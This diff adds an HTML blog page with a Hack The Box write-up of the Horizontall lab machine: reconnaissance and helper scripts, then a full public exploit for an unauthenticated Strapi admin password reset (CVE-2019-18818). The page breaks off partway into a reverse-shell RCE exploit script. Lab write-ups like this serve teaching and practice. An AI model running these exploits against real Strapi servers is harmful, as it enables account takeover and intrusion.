@@ -1,0 +1,1019 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HTB - Horinzontall - bynafrez08.io</title>
+<meta name="description" content="Horizontall is a linux machine with easy difficulty level both in the exploitation phase and the privilege escalation is cataloged as medium difficulty, this machine uses the cms strapi version 3.0 beta that has vulnerabilities such as RCE, change users passwords and also the machine has an http server running on port 8000 that is running laravel version 8 that has the vulnerability CVE-2021-3129 (RCE).">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="bynafrez08.io">
+<meta property="og:title" content="HTB - Horinzontall">
+<meta property="og:url" content="http://localhost:4000/htb-horizontall/">
+
+
+  <meta property="og:description" content="Horizontall is a linux machine with easy difficulty level both in the exploitation phase and the privilege escalation is cataloged as medium difficulty, this machine uses the cms strapi version 3.0 beta that has vulnerabilities such as RCE, change users passwords and also the machine has an http server running on port 8000 that is running laravel version 8 that has the vulnerability CVE-2021-3129 (RCE).">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/img-horizontall/portada.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2022-01-06T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-horizontall/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="bynafrez08.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+   <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Article</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/buscador/">Search</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">HTB - Horinzontall</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar1.png" alt="Nafsu Uddin | AKA bynafrez" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Nafsu Uddin | AKA bynafrez</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Networking / Pentesting / Offensive Security
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/bynafrez08" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HTB - Horinzontall">
+    <meta itemprop="description" content="Horizontall is a linux machine with easy difficulty level both in the exploitation phase and the privilege escalation is cataloged as medium difficulty, this machine uses the cms strapi version 3.0 beta that has vulnerabilities such as RCE, change users passwords and also the machine has an http server running on port 8000 that is running laravel version 8 that has the vulnerability CVE-2021-3129 (RCE).">
+    <meta itemprop="datePublished" content="January 06, 2022">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">HTB - Horinzontall
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-01-06T00:00:00-05:00">January 06, 2022 </time> 
+          
+          
+        </p>
+        <p>Horizontall is a linux machine with easy difficulty level both in the exploitation phase and the privilege escalation is cataloged as medium difficulty, this machine uses the cms strapi version 3.0 beta that has vulnerabilities such as RCE, changes users passwords, and also the machine has an http server running on port 8000 that is running laravel version 8 that has the vulnerability CVE-2021-3129 (RCE).</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/portada.png">
+</p>
+
+<p>Machine rating according to the people.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/calificacion.png">
+</p>
+
+<p>Machine matrix:</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/matrix.png">
+</p>
+
+<p>The first thing we are going to do is to create a file with the machine name, and inside of that file with <strong><em>mkt</em></strong> we are going to create to following directories (the mkt function remember that I have it defined in the <strong><em>~/.zshr</em></strong> to create those directories.).</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura1.png">
+</p>
+
+<h2 id="recognition">Recognition</h2>
+
+<p>First we send an icmp trace to see if we have a connection on the victim machine, and with the ttl i know this is a linux machine, remember that linux machines have ttl 64 and windows machines have ttl 128. In my machine I have defined a python script that through the ttl reports me if it is a windows or linux machine in a more elegant way, in the case if we don’t remember which ttl belongs to which OS.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/system1.png">
+</p>
+
+<p>wichsystem script:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+#coding: utf-8
+</span> 
+<span class="kn">import</span> <span class="nn">re</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">subprocess</span>
+ 
+<span class="c1"># python3 wichSystem.py YOURIP 
+</span> 
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Uso: python3 "</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">" &lt;direccion-ip&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+ 
+<span class="k">def</span> <span class="nf">get_ttl</span><span class="p">(</span><span class="n">ip_address</span><span class="p">):</span>
+ 
+    <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">"/usr/bin/ping -c 1 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">ip_address</span><span class="p">,</span> <span class="s">""</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">err</span><span class="p">)</span> <span class="o">=</span> <span class="n">proc</span><span class="o">.</span><span class="n">communicate</span><span class="p">()</span>
+ 
+    <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+ 
+    <span class="n">ttl_value</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r"\d{1,3}"</span><span class="p">,</span> <span class="n">out</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+ 
+    <span class="k">return</span> <span class="n">ttl_value</span>
+ 
+<span class="k">def</span> <span class="nf">get_os</span><span class="p">(</span><span class="n">ttl</span><span class="p">):</span>
+ 
+    <span class="n">ttl</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ttl</span><span class="p">)</span>
+ 
+    <span class="k">if</span> <span class="n">ttl</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">ttl</span> <span class="o">&lt;=</span> <span class="mi">64</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s">"Linux"</span>
+    <span class="k">elif</span> <span class="n">ttl</span> <span class="o">&gt;=</span> <span class="mi">65</span> <span class="ow">and</span> <span class="n">ttl</span> <span class="o">&lt;=</span> <span class="mi">128</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s">"Windows"</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s">"Not Found"</span>
+ 
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+ 
+    <span class="n">ip_address</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+ 
+    <span class="n">ttl</span> <span class="o">=</span> <span class="n">get_ttl</span><span class="p">(</span><span class="n">ip_address</span><span class="p">)</span>
+ 
+    <span class="n">os_name</span> <span class="o">=</span> <span class="n">get_os</span><span class="p">(</span><span class="n">ttl</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="si">%</span><span class="s">s (ttl -&gt; </span><span class="si">%</span><span class="s">s): </span><span class="si">%</span><span class="s">s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">ip_address</span><span class="p">,</span> <span class="n">ttl</span><span class="p">,</span> <span class="n">os_name</span><span class="p">))</span>
+</code></pre></div></div>
+
+<h2 id="scanning---ports-recognition">Scanning - Ports recognition</h2>
+
+<p>I am going to perform a tcp syn scan by adding the <strong><em>min-rate</em></strong> parameter to make the scan go as fast as possible, and the evidence of the scan I will save it in grepable format in the allports file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.92 scan initiated Mon Dec 27 17:13:35 2021 as: nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn -oG allports 10.10.11.105
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.11.105 ()   Status: Up
+Host: 10.10.11.105 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///        Ignored State: closed (65533)
+# Nmap done at Mon Dec 27 17:13:46 2021 -- 1 IP address (1 host up) scanned in 11.21 seconds
+</code></pre></div></div>
+<p>Basically i save it in the grepable format is that i have a function defined in the <strong><em>~/.zshrc</em></strong> called extractports that indicating the name of the file shows me the ports in a more elegant way and copies the ports it to clipboard.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura3.png">
+</p>
+
+<p>Extractports script:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="k">function </span>extractPorts<span class="o">(){</span>
+        <span class="nv">ports</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,5}/open'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'/'</span> | xargs | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">','</span><span class="si">)</span><span class="s2">"</span>
+        <span class="nv">ip_address</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'</span> | <span class="nb">sort</span> <span class="nt">-u</span> | <span class="nb">head</span> <span class="nt">-n</span> 1<span class="si">)</span><span class="s2">"</span>
+        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[*] Extracting information...</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;</span> extractPorts.tmp
+        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] IP Address: </span><span class="nv">$ip_address</span><span class="s2">"</span>  <span class="o">&gt;&gt;</span> extractPorts.tmp
+        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] Open ports: </span><span class="nv">$ports</span><span class="se">\n</span><span class="s2">"</span>  <span class="o">&gt;&gt;</span> extractPorts.tmp
+        <span class="nb">echo</span> <span class="nv">$ports</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | xclip <span class="nt">-sel</span> clip
+        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"[*] Ports copied to clipboard</span><span class="se">\n</span><span class="s2">"</span>  <span class="o">&gt;&gt;</span> extractPorts.tmp
+        <span class="nb">cat </span>extractPorts.tmp<span class="p">;</span> <span class="nb">rm </span>extractPorts.tmp
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>And with the ports discovered we are going to perform another scan to know the versions of the services that run those ports with some recognition scripts (-sCV), and i will save the evidence of the scan in nmap format (it is advisable to save the scans in a file to avoid re-scanning).</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.92 scan initiated Mon Dec 27 17:15:26 2021 as: nmap -sCV -p22,80 -oN targeted 10.10.11.105
+Nmap scan report for 10.10.11.105
+Host is up (0.043s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
+|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
+|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://horizontall.htb
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Dec 27 17:15:38 2021 -- 1 IP address (1 host up) scanned in 12.69 seconds
+</code></pre></div></div>
+<p>As there is a web server on port 80 with whatweb we do a small recognition as if it were wappalyzere extension, to know the version of the web service, cms, etc. It reports that it cannot recognize the address <strong><em>horizontall.htb</em></strong> and means that virtual hosting is being applied.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura4.png">
+</p>
+
+<p>So what we are going to do in the <strong><em>/etc/hosts</em></strong> file we are going to specify the ip of the victim machine and the domain.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura5.png">
+</p>
+
+<p>We access on the website with the domain and the wappalyzer reports the following information about the web.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura7.png">
+</p>
+
+<p>The web page had a contact form and i wanted to test if the web was vulnerable to xss attacks, but the contact form can not send the request to the server.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura8.png">
+</p>
+
+<p>Reviewing the code of the page i found something interesting we see that there is a subdomain that could lead us to something, let’s see what it is.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura10.png">
+</p>
+
+<p>Before accessing in this subdomain, we will proceed with the fuzzing phase to see if there are more routes on the web, there is also a dictionary to fuzz if there is any subdomain under a domain and in this case we see that it reports the subdomain that we just saw in the code of the website.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura11.png">
+</p>
+
+<p>I then proceeded to fuzzing the subdomain that i found and the gobuster reports me in the terminal the routes that has been found.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura12.png">
+</p>
+
+<p>And accessing in the subdomain we see that in the admin path there is a panel to log in the strapi cms.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura13.png">
+</p>
+
+<p>I tried to access the path <strong><em>users</em></strong> and it says <strong><em>forbidden</em></strong> that means that the server has found the path but we don’t have access.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura14.png">
+</p>
+
+<p>I tried to test if the site was vulnerable to sql injections, but in this case we see that it is not.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura15.png">
+</p>
+
+<p>At the moment we don’t have any valid credentials to access, let’s see with <strong><em>searchsploit</em></strong> what vulnerabilities has the strapi cms. and we see that there are critical vulnerabilities like the RCE in the 3.0 beta version and also to add passwords, hmm interesting.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura16.png">
+</p>
+
+<p>Looking the script what it allows us is with a valid user that is created in strapi we can change the password, and this case what i have done is to use the user admin to try if it’s works, the subdomain and the last adding a password for this user and save the file.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura17.png">
+</p>
+
+<p>The exploit:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Exploit Title: Strapi 3.0.0-beta - Set Password (Unauthenticated)
+# Date: 2021-08-29
+# Exploit Author: David Anglada [CodiObert]
+# Vendor Homepage: https://strapi.io/
+# Version: 3.0.0-beta
+# Tested on: Linux
+# CVE: CVE-2019-18818
+</span>
+<span class="c1">#!/usr/bin/python
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">json</span>
+
+<span class="n">userEmail</span> <span class="o">=</span> <span class="s">"admin@horizontall.htb"</span>
+<span class="n">strapiUrl</span> <span class="o">=</span> <span class="s">"http://api-prod.horizontall.htb"</span>
+<span class="n">newPassword</span> <span class="o">=</span> <span class="s">"code12345"</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+
+<span class="c1"># Get strapi version
+</span><span class="n">strapiVersion</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">"{}/admin/strapiVersion"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">strapiUrl</span><span class="p">))</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"[*] strapi version: {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">strapiVersion</span><span class="p">[</span><span class="s">"strapiVersion"</span><span class="p">]))</span>
+
+<span class="c1"># Validate vulnerable version
+</span><span class="k">if</span> <span class="n">strapiVersion</span><span class="p">[</span><span class="s">"strapiVersion"</span><span class="p">]</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">'3.0.0-beta'</span><span class="p">)</span> <span class="ow">or</span> <span class="n">strapiVersion</span><span class="p">[</span><span class="s">"strapiVersion"</span><span class="p">]</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">'3.0.0-alpha'</span><span class="p">):</span>
+	<span class="c1"># Password reset
+</span>	<span class="k">print</span><span class="p">(</span><span class="s">"[*] Password reset for user: {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">userEmail</span><span class="p">))</span>
+	<span class="n">resetPasswordReq</span><span class="o">=</span><span class="p">{</span><span class="s">"email"</span><span class="p">:</span><span class="n">userEmail</span><span class="p">,</span> <span class="s">"url"</span><span class="p">:</span><span class="s">"{}/admin/plugins/users-permissions/auth/reset-password"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">strapiUrl</span><span class="p">)}</span>
+	<span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"{}/"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">strapiUrl</span><span class="p">),</span> <span class="n">json</span><span class="o">=</span><span class="n">resetPasswordReq</span><span class="p">)</span>
+
+	<span class="c1"># Set new password
+</span>	<span class="k">print</span><span class="p">(</span><span class="s">"[*] Setting new password"</span><span class="p">)</span>
+	<span class="n">exploit</span><span class="o">=</span><span class="p">{</span><span class="s">"code"</span><span class="p">:{},</span> <span class="s">"password"</span><span class="p">:</span><span class="n">newPassword</span><span class="p">,</span> <span class="s">"passwordConfirmation"</span><span class="p">:</span><span class="n">newPassword</span><span class="p">}</span>
+	<span class="n">r</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"{}/admin/auth/reset-password"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">strapiUrl</span><span class="p">),</span> <span class="n">json</span><span class="o">=</span><span class="n">exploit</span><span class="p">)</span>
+
+	<span class="c1"># Check if the password has changed
+</span>	<span class="k">if</span> <span class="s">"username"</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">):</span>
+		<span class="k">print</span><span class="p">(</span><span class="s">"[+] New password '{}' set for user {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">newPassword</span><span class="p">,</span> <span class="n">userEmail</span><span class="p">))</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[91m[-] Something went wrong</span><span class="se">\033</span><span class="s">[0m"</span><span class="p">)</span>
+		<span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[91m[-] This version is not vulnerable</span><span class="se">\033</span><span class="s">[0m"</span><span class="p">)</span>
+	<span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>According to the indication of this exploit we execute the script as follow command, and it should change the user’s password.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura18.png">
+</p>
+
+<p>Ok so let’s check if it’s work, and we can see that i have access to the admin account on strapi. And we can see the strapi version and affectively it is the vulnerable version.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura19.png">
+</p>
+
+<p>So, in the user section we can see more users and there password hashes.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura20.png">
+</p>
+
+<p>And there was a file upload section, i tried to upload a malicious file or a malicious plugin to somehow gain access to the victim machine, but it didn’t work.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura21.png">
+</p>
+
+<p>Remember that before with <strong><em>seacrhsploit</em></strong> that reported us strapi exploits for RCE, in my case for some reason i don’t know why it din’t work thos two exploits so i decided to look for one and i found the following exploit. And something to mention this strapi vulnerability is registered as <strong><em>CVE-2019-19609-EXPLOIT</em></strong>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/bin/python
+</span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">argparse</span>
+
+<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'Exploit for CVE-2019-16609 in Strapi'</span><span class="p">)</span>
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-d'</span><span class="p">,</span> <span class="s">'--domain'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Target IP or domain'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-jwt'</span><span class="p">,</span> <span class="s">'--jwtoken'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Json web token authenticate'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-l'</span><span class="p">,</span> <span class="s">'--lhost'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Your host'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-p'</span><span class="p">,</span> <span class="s">'--port'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Port your machine is listening on'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">domain</span>
+<span class="n">port</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">port</span>
+<span class="n">jwt</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">jwtoken</span>
+<span class="n">host</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">lhost</span>
+<span class="n">urlVuln</span> <span class="o">=</span> <span class="s">"http://"</span><span class="o">+</span><span class="n">url</span> <span class="o">+</span> <span class="s">"/admin/plugins/install"</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"[+] Exploit for Remote Code Execution for strapi-3.0.0-beta.17.7 and earlier (CVE-2019-19609)"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"[+] Remember to start listening to the port "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">)</span><span class="o">+</span><span class="s">" to get a reverse shell"</span><span class="p">)</span> 
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Host'</span><span class="p">:</span> <span class="n">url</span><span class="p">,</span> <span class="s">'Authorization'</span><span class="p">:</span> <span class="s">'Bearer '</span><span class="o">+</span><span class="n">jwt</span><span class="p">,</span> <span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/json'</span><span class="p">,</span> <span class="s">'Content-Length'</span><span class="p">:</span> <span class="s">'131'</span><span class="p">,</span> <span class="s">'Connection'</span><span class="p">:</span> <span class="s">'close'</span><span class="p">}</span>
+
